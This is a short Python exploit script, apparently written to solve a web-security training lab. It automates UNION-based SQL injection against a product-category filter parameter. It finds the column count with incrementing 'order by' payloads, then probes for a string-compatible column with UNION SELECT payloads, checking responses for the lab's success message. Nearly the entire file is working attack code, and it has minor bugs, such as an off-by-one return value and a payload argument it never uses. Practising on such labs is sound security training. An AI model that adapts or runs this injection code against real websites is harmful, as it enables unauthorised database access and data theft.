import requests
import urllib3
from bs4 import BeautifulSoup
import time
import sys
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


proxies = {'https':'127.0.0.1:8080'}

def exploit(url):
    uri = '/filter?category=Pets'
    for i in range(1,50):
        sql_payload = f"' order by {i}--"
        r = requests.get(url+uri+sql_payload, verify=False)
        res = r.text

        if "Internal Server Error" in res:
            return i - 1

    return False

def get_col_field(url, num_col):
    uri = '/filter?category=Pets'
    for i in range(1, num_col + 1):
        string = "'McQYMz'"
        payload_list = ['NULL'] * num_col
        payload_list[i - 1] = string
        sql_payload = "'UNION select " + ",".join(payload_list) + "--"
        print(sql_payload)
        r = requests.get(url + uri + sql_payload, verify=False)
        res = r.text
        if 'Congratulations, you solved the lab!' in res:
            return i + 1
    return False



if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        # payload = sys.argv[2].strip()
    except IndexError:
        print('[-] Usage: %s <url> <sql-payload>' % sys.argv[0])
        print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
        sys.exit(-1)
    print(f"[{time.time()}] Figuring out number of columns.")
    num_col = exploit(url)
    if exploit(url):
        print(f'[{time.time()}] SQL injection successful! Column number is {num_col}')
        string_col = get_col_field(url,num_col)
        print(f'[{time.time()}] The text in in col {string_col}.')
    else:
        print('[-] SQL injection unsuccessful.')

